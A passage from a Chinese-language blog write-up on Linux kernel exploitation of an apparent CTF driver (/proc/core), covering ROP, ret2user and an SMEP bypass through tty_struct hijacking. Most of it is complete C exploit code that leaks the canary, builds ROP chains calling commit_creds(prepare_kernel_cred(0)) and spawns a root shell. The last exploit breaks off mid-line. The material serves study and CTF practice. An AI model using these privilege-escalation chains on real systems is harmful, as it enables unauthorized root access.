class="number">0</span>&#125;;</span><br><span class="line">         <span class="built_in">strncpy</span>(hex,buf,<span class="number">16</span>);</span><br><span class="line">         <span class="built_in">sscanf</span>(hex,<span class="string">&quot;%llx&quot;</span>,&amp;prepare_kernel_cred);</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred addr: %p\n&quot;</span>,prepare_kernel_cred);</span><br><span class="line">         vmlinux_base = prepare_kernel_cred - <span class="number">0x9cce0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(!commit_creds &amp; !prepare_kernel_cred)&#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;[*]read kallsyms error!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_rflags,user_ss,user_cs,user_sp;</span><br><span class="line"> <span class="type">void</span> <span class="title function_">save_stats</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="keyword">asm</span>(</span><br><span class="line">		<span class="string">&quot;movq %%cs, %0\n&quot;</span></span><br><span class="line">		<span class="string">&quot;movq %%ss, %1\n&quot;</span></span><br><span class="line">		<span class="string">&quot;movq %%rsp, %3\n&quot;</span></span><br><span class="line">		<span class="string">&quot;pushfq\n&quot;</span></span><br><span class="line">		<span class="string">&quot;popq %2\n&quot;</span></span><br><span class="line">		:<span class="string">&quot;=r&quot;</span>(user_cs), <span class="string">&quot;=r&quot;</span>(user_ss), <span class="string">&quot;=r&quot;</span>(user_rflags),<span class="string">&quot;=r&quot;</span>(user_sp)</span><br><span class="line"> 		:</span><br><span class="line"> 		: <span class="string">&quot;memory&quot;</span></span><br><span class="line"> 	);</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;[*] get shell successfully!&quot;</span>);</span><br><span class="line">   system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">size_t</span> canary=<span class="number">0</span>;</span><br><span class="line">   <span class="type">size_t</span> buf[<span class="number">0x80</span>];</span><br><span class="line">   save_stats();</span><br><span class="line">   <span class="type">int</span> fd=open(<span class="string">&quot;/proc/core&quot;</span>,O_RDWR);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;core fd is %d\n&quot;</span>,fd);</span><br><span class="line"></span><br><span class="line">   ioctl(fd,<span class="number">0x6677889C</span>,<span class="number">0x40</span>);</span><br><span class="line">   ioctl(fd,<span class="number">0x6677889B</span>,&amp;buf);</span><br><span class="line">   canary=(<span class="type">size_t</span>)(buf[<span class="number">0</span>]);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;canary is %p\n&quot;</span>,canary);</span><br><span class="line">   find_symbols();</span><br><span class="line"></span><br><span class="line">   <span class="type">size_t</span> rop[<span class="number">0x400</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">   <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line">   <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)</span><br><span class="line">   &#123;</span><br><span class="line">      rop[i]=<span class="number">0</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   rop[i++]=canary;</span><br><span class="line">   rop[i++]=<span class="number">0xdeadbeefdeadbeef</span>;<span class="comment">//rbp(junk)</span></span><br><span class="line">   rop[i++]=vmlinux_base+<span class="number">0xb2f</span>;<span class="comment">//pop rdi ; ret</span></span><br><span class="line">   rop[i++]=<span class="number">0</span>;</span><br><span class="line">   rop[i++]=prepare_kernel_cred;<span class="comment">//commit_creds(prepare_kernel_cred(0))</span></span><br><span class="line"></span><br><span class="line">   rop[i++]=vmlinux_base+<span class="number">0xa0f49</span>; <span class="comment">//pop rdx ; ret</span></span><br><span class="line">   rop[i++]=commit_creds;</span><br><span class="line">   rop[i++]=vmlinux_base+<span class="number">0x6a6d2</span>; <span class="comment">//mov rdi, rax ; jmp rdx</span></span><br><span class="line">   </span><br><span class="line">   rop[i++]=vmlinux_base+<span class="number">0xa012da</span>;<span class="comment">//swapgs; popfq; ret</span></span><br><span class="line">   rop[i++]=<span class="number">0</span>;</span><br><span class="line">   rop[i++] = vmlinux_base + <span class="number">0x50ac2</span>;      <span class="comment">//iretp_ret</span></span><br><span class="line">   rop[i++] = (<span class="type">size_t</span>)get_shell; <span class="comment">//RIP</span></span><br><span class="line">   rop[i++] = user_cs;<span class="comment">//CS</span></span><br><span class="line">   rop[i++] = user_rflags;<span class="comment">//rflags</span></span><br><span class="line">   rop[i++] = user_sp;<span class="comment">//RSP</span></span><br><span class="line">   rop[i++] = user_ss;<span class="comment">//SS</span></span><br><span class="line"></span><br><span class="line">   write(fd,rop,<span class="number">0x400</span>);</span><br><span class="line">   ioctl(fd,<span class="number">0x6677889A</span>,<span class="number">0xffffffffffff0000</span> | (<span class="number">0xd0</span>));</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="ret2user">ret2user</h2>
<p><code>ret2user</code> 和上面的 <code>ROP</code> 非常相似（毕竟本质上还是 <code>ROP</code> ），给我的感觉是 <code>ret2user</code> 在控制参数方面有很大的优势，它是将执行流返回到了用户态中布置的函数上，虽然执行的函数是位于内核空间，但因为我们的权限是 <code>ring 0</code>，因此依然可以正常运行。其根本原因是因为内核空间可以访问用户空间的进程（反之则不行），以内核的权限执行用户空间的代码完成提权（前提是没有开启 <code>SMEP</code> 保护）</p>
<h3 id="EXP-v2">EXP</h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0</span>,prepare_kernel_cred = <span class="number">0</span>,vmlinux_base = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">find_symbols</span><span class="params">()</span>&#123;</span><br><span class="line">   FILE* kallsyms_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">   <span class="keyword">if</span>(kallsyms_fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;[*]open kallsyms error!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">   &#125;</span><br><span class="line">    </span><br><span class="line">   <span class="type">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">   <span class="keyword">while</span>(fgets(buf,<span class="number">0x30</span>,kallsyms_fd))&#123;</span><br><span class="line">      <span class="keyword">if</span>(commit_creds &amp; prepare_kernel_cred)</span><br><span class="line">         <span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//End condition</span></span><br><span class="line">      <span class="comment">//find commit_creds</span></span><br><span class="line">      <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf,<span class="string">&quot;commit_creds&quot;</span>) &amp;&amp; !commit_creds)&#123;</span><br><span class="line">         <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">         <span class="built_in">strncpy</span>(hex,buf,<span class="number">16</span>);</span><br><span class="line">         <span class="built_in">sscanf</span>(hex,<span class="string">&quot;%llx&quot;</span>,&amp;commit_creds);</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;commit_creds addr: %p\n&quot;</span>,commit_creds);</span><br><span class="line">         vmlinux_base = commit_creds - <span class="number">0x9c8e0</span>;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;vmlinux_base addr: %p\n&quot;</span>,vmlinux_base);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">//find prepare_kernel_cred</span></span><br><span class="line">      <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf,<span class="string">&quot;prepare_kernel_cred&quot;</span>) &amp;&amp; !prepare_kernel_cred)&#123;</span><br><span class="line">         <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">         <span class="built_in">strncpy</span>(hex,buf,<span class="number">16</span>);</span><br><span class="line">         <span class="built_in">sscanf</span>(hex,<span class="string">&quot;%llx&quot;</span>,&amp;prepare_kernel_cred);</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred addr: %p\n&quot;</span>,prepare_kernel_cred);</span><br><span class="line">         vmlinux_base = prepare_kernel_cred - <span class="number">0x9cce0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(!commit_creds &amp; !prepare_kernel_cred)&#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;[*]read kallsyms error!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_rflags,user_ss,user_cs,user_sp;</span><br><span class="line"> <span class="type">void</span> <span class="title function_">save_stats</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="keyword">asm</span>(</span><br><span class="line">		<span class="string">&quot;movq %%cs, %0\n&quot;</span></span><br><span class="line">		<span class="string">&quot;movq %%ss, %1\n&quot;</span></span><br><span class="line">		<span class="string">&quot;movq %%rsp, %3\n&quot;</span></span><br><span class="line">		<span class="string">&quot;pushfq\n&quot;</span></span><br><span class="line">		<span class="string">&quot;popq %2\n&quot;</span></span><br><span class="line">		:<span class="string">&quot;=r&quot;</span>(user_cs), <span class="string">&quot;=r&quot;</span>(user_ss), <span class="string">&quot;=r&quot;</span>(user_rflags),<span class="string">&quot;=r&quot;</span>(user_sp)</span><br><span class="line"> 		:</span><br><span class="line"> 		: <span class="string">&quot;memory&quot;</span></span><br><span class="line"> 	);</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;[*] ret2user [*]&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;[*] get shell successfully!&quot;</span>);</span><br><span class="line">   system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_root</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span>* (*pkc)(<span class="type">int</span>) = prepare_kernel_cred;</span><br><span class="line">    <span class="type">void</span> (*cc)(<span class="type">char</span>*) = commit_creds;</span><br><span class="line">    (*cc)((*pkc)(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">size_t</span> canary=<span class="number">0</span>;</span><br><span class="line">   <span class="type">size_t</span> buf[<span class="number">0x80</span>];</span><br><span class="line">   save_stats();</span><br><span class="line">   <span class="type">int</span> fd=open(<span class="string">&quot;/proc/core&quot;</span>,O_RDWR);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;core fd is %d\n&quot;</span>,fd);</span><br><span class="line"></span><br><span class="line">   ioctl(fd,<span class="number">0x6677889C</span>,<span class="number">0x40</span>);</span><br><span class="line">   ioctl(fd,<span class="number">0x6677889B</span>,&amp;buf);</span><br><span class="line">   canary=(<span class="type">size_t</span>)(buf[<span class="number">0</span>]);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;canary is %p\n&quot;</span>,canary);</span><br><span class="line">   find_symbols();</span><br><span class="line"></span><br><span class="line">   <span class="type">size_t</span> rop[<span class="number">0x400</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">   <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line">   <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)</span><br><span class="line">   &#123;</span><br><span class="line">      rop[i]=<span class="number">0</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   rop[i++]=canary;</span><br><span class="line">   rop[i++]=<span class="number">0xdeadbeefdeadbeef</span>;<span class="comment">//rbp(junk)</span></span><br><span class="line">   rop[i++]=(<span class="type">size_t</span>)get_root;</span><br><span class="line">   rop[i++]=vmlinux_base+<span class="number">0xa012da</span>;<span class="comment">//swapgs; popfq; ret</span></span><br><span class="line">   rop[i++]=<span class="number">0</span>;</span><br><span class="line">   rop[i++] = vmlinux_base + <span class="number">0x50ac2</span>;      <span class="comment">//iretp_ret</span></span><br><span class="line">   rop[i++] = (<span class="type">size_t</span>)get_shell; <span class="comment">//RIP</span></span><br><span class="line">   rop[i++] = user_cs;<span class="comment">//CS</span></span><br><span class="line">   rop[i++] = user_rflags;<span class="comment">//rflags</span></span><br><span class="line">   rop[i++] = user_sp;<span class="comment">//RSP</span></span><br><span class="line">   rop[i++] = user_ss;<span class="comment">//SS</span></span><br><span class="line"></span><br><span class="line">   write(fd,rop,<span class="number">0x400</span>);</span><br><span class="line">   ioctl(fd,<span class="number">0x6677889A</span>,<span class="number">0xffffffffffff0000</span> | (<span class="number">0xd0</span>));</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这两份 <code>EXP</code> 其实很像，只有执行 <code>commit_creds(prepare_kernel_cred(0))</code> 函数的部分不一样（如下）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">get_root</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span>* (*pkc)(<span class="type">int</span>) = prepare_kernel_cred;</span><br><span class="line">    <span class="type">void</span> (*cc)(<span class="type">char</span>*) = commit_creds;</span><br><span class="line">    (*cc)((*pkc)(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但有意思的是，无法在此处执行用户态的函数，因为我调用了 <code>puts</code> 函数，发现内核崩溃了，我认为其原因是状态寄存器没有进行切换所导致的，因此还得再回到内核中去恢复状态寄存器的值，最终执行用户态中的 <code>system(&quot;/bin/sh&quot;)</code></p>
<h2 id="bypass-SMEP">bypass-SMEP</h2>
<h3 id="前置知识">前置知识</h3>
<p><code>SMEP</code> 全称 <code>Supervisor Mode Execution Protection</code> ，当 <code>CPU</code> 处于 <code>ring0</code> 模式时执行用户空间的代码会触发页错误（该防御机制会将页表中的用户空间内存页标记为不可执行），目的是为了防止 <code>ret2user</code>。在启动时， <code>-cpu</code> 选项下加入 <code>+smep</code> 启用该防御机制，在 <code>-append</code> 选项下加入 <code>nosmep</code> 禁用该机制。</p>
<p>系统会根据 <code>CR4</code> 寄存器中第二十位的值来判断 <code>SMEP</code> 保护是否开启（ <code>1</code> 为开启，<code>0</code> 为关闭 ）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304211706032.png" alt="image-20230421170620883"></p>
<p>在打开 <code>/dev/ptmx</code> 设备时，会分配一个 <code>tty_struct</code> 结构体，定义如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> magic;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kref</span> <span class="title">kref</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">dev</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>;</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">    <span class="type">int</span> index;</span><br><span class="line">    <span class="comment">/* Protects ldisc changes: Lock tty not pty */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ld_semaphore</span> <span class="title">ldisc_sem</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_ldisc</span> *<span class="title">ldisc</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">atomic_write_lock</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">legacy_mutex</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">throttle_mutex</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rw_semaphore</span> <span class="title">termios_rwsem</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">winsize_mutex</span>;</span></span><br><span class="line">    <span class="type">spinlock_t</span> ctrl_lock;</span><br><span class="line">    <span class="type">spinlock_t</span> flow_lock;</span><br><span class="line">    <span class="comment">/* Termios values are protected by the termios rwsem */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ktermios</span> <span class="title">termios</span>, <span class="title">termios_locked</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">termiox</span> *<span class="title">termiox</span>;</span>    <span class="comment">/* May be NULL for unsupported */</span></span><br><span class="line">    <span class="type">char</span> name[<span class="number">64</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">pgrp</span>;</span>       <span class="comment">/* Protected by ctrl lock */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">session</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> flags;</span><br><span class="line">    <span class="type">int</span> count;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">winsize</span> <span class="title">winsize</span>;</span>     <span class="comment">/* winsize_mutex */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> stopped:<span class="number">1</span>,    <span class="comment">/* flow_lock */</span></span><br><span class="line">              flow_stopped:<span class="number">1</span>,</span><br><span class="line">              unused:BITS_PER_LONG - <span class="number">2</span>;</span><br><span class="line">    <span class="type">int</span> hw_stopped;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> ctrl_status:<span class="number">8</span>,    <span class="comment">/* ctrl_lock */</span></span><br><span class="line">              packet:<span class="number">1</span>,</span><br><span class="line">              unused_ctrl:BITS_PER_LONG - <span class="number">9</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> receive_room;  <span class="comment">/* Bytes free for queue */</span></span><br><span class="line">    <span class="type">int</span> flow_change;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">link</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync</span>;</span></span><br><span class="line">    <span class="type">wait_queue_head_t</span> write_wait;</span><br><span class="line">    <span class="type">wait_queue_head_t</span> read_wait;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">hangup_work</span>;</span></span><br><span class="line">    <span class="type">void</span> *disc_data;</span><br><span class="line">    <span class="type">void</span> *driver_data;</span><br><span class="line">    <span class="type">spinlock_t</span> files_lock;      <span class="comment">/* protects tty_files list */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">tty_files</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N_TTY_BUF_SIZE 4096</span></span><br><span class="line">    <span class="type">int</span> closing;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *write_buf;</span><br><span class="line">    <span class="type">int</span> write_cnt;</span><br><span class="line">    <span class="comment">/* If the tty has a pending do_SAK, queue it here - akpm */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">SAK_work</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_port</span> *<span class="title">port</span>;</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>
<p>其中关注的是 <code>const struct tty_operations *ops</code> 指针，该指针指向了结构体 <code>tty_operations</code> （定义如下）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> * (*<span class="title">lookup</span>)(<span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>,</span></span><br><span class="line"><span class="class">            <span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span>, <span class="title">int</span> <span class="title">idx</span>);</span></span><br><span class="line">    <span class="type">int</span>  (*install)(<span class="keyword">struct</span> tty_driver *driver, <span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*remove)(<span class="keyword">struct</span> tty_driver *driver, <span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span>  (*open)(<span class="keyword">struct</span> tty_struct * tty, <span class="keyword">struct</span> file * filp);</span><br><span class="line">    <span class="type">void</span> (*close)(<span class="keyword">struct</span> tty_struct * tty, <span class="keyword">struct</span> file * filp);</span><br><span class="line">    <span class="type">void</span> (*shutdown)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*cleanup)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span>  (*write)(<span class="keyword">struct</span> tty_struct * tty,</span><br><span class="line">              <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *buf, <span class="type">int</span> count);</span><br><span class="line">    <span class="type">int</span>  (*put_char)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">unsigned</span> <span class="type">char</span> ch);</span><br><span class="line">    <span class="type">void</span> (*flush_chars)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span>  (*write_room)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span>  (*chars_in_buffer)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span>  (*ioctl)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg);</span><br><span class="line">    <span class="type">long</span> (*compat_ioctl)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">                 <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg);</span><br><span class="line">    <span class="type">void</span> (*set_termios)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> ktermios * old);</span><br><span class="line">    <span class="type">void</span> (*throttle)(<span class="keyword">struct</span> tty_struct * tty);</span><br><span class="line">    <span class="type">void</span> (*unthrottle)(<span class="keyword">struct</span> tty_struct * tty);</span><br><span class="line">    <span class="type">void</span> (*stop)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*start)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*hangup)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span> (*break_ctl)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">int</span> state);</span><br><span class="line">    <span class="type">void</span> (*flush_buffer)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*set_ldisc)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*wait_until_sent)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">int</span> timeout);</span><br><span class="line">    <span class="type">void</span> (*send_xchar)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">char</span> ch);</span><br><span class="line">    <span class="type">int</span> (*tiocmget)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span> (*tiocmset)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">int</span> <span class="built_in">set</span>, <span class="type">unsigned</span> <span class="type">int</span> clear);</span><br><span class="line">    <span class="type">int</span> (*resize)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> winsize *ws);</span><br><span class="line">    <span class="type">int</span> (*set_termiox)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> termiox *tnew);</span><br><span class="line">    <span class="type">int</span> (*get_icount)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">                <span class="keyword">struct</span> serial_icounter_struct *icount);</span><br><span class="line">    <span class="type">void</span> (*show_fdinfo)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> seq_file *m);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_CONSOLE_POLL</span></span><br><span class="line">    <span class="type">int</span> (*poll_init)(<span class="keyword">struct</span> tty_driver *driver, <span class="type">int</span> line, <span class="type">char</span> *options);</span><br><span class="line">    <span class="type">int</span> (*poll_get_char)(<span class="keyword">struct</span> tty_driver *driver, <span class="type">int</span> line);</span><br><span class="line">    <span class="type">void</span> (*poll_put_char)(<span class="keyword">struct</span> tty_driver *driver, <span class="type">int</span> line, <span class="type">char</span> ch);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="type">int</span> (*proc_show)(<span class="keyword">struct</span> seq_file *, <span class="type">void</span> *);</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>
<p>如果能劫持掉上面的指针，在对 <code>/dev/ptmx</code> 文件进行 <code>write</code> 或者 <code>read</code> 等操作时就可以跳转我们指定的函数指针执行，有点类似于 <code>FSOP</code></p>
<h3 id="利用思路">利用思路</h3>
<p>在劫持的位置先进行第一次迁移，<code>rax</code> 正好是 <code>fake_tty_operation</code> 的地址，于是，我们把栈转移到 <code>fake_tty_operations</code> 里,此处是可以放一少部分 <code>gadget</code> ，用这部分进行第二次迁移，迁移到堆块中的 <code>rop</code> 链上，用 <code>mov cr4,rdi</code> 这个 <code>gadget</code> 来改变 <code>cr4</code> 寄存器的值从而绕过 <code>SMEP</code> 保护，随后打一个 <code>ret2user</code> 即可完成提权。</p>
<p>此处的 <code>EXP</code> 用的是 <a target="_blank" rel="noopener" href="https://blog.csdn.net/seaaseesa/article/details/104577501">ha1vk</a>  师傅的，因为这题已经做过了，并且 <code>ha1vk</code> 师傅写的也很详细，再写一遍也没有什么大的改变</p>
<h3 id="EXP-v3">EXP</h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//tty_struct结构体的大小</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TTY_STRUCT_SIZE 0x2E0</span></span><br><span class="line"><span class="comment">//mov cr4, rdi ; pop rbp ; ret</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MOV_CR4_RDI 0xffffffff81004d80</span></span><br><span class="line"><span class="comment">//pop rdi ; ret</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RDI 0xffffffff810d238d</span></span><br><span class="line"><span class="comment">//swapgs ; pop rbp ; ret</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SWAPGS 0xffffffff81063694</span></span><br><span class="line"><span class="comment">//iretq</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRETQ 0xFFFFFFFF8181A797</span></span><br><span class="line"><span class="comment">//commit_creds函数</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COMMIT_CREDS 0xffffffff810a1420</span></span><br><span class="line"><span class="comment">// prepare_kernel_cred</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff810a1810</span></span><br><span class="line"><span class="comment">//mov rsp, rax;dec 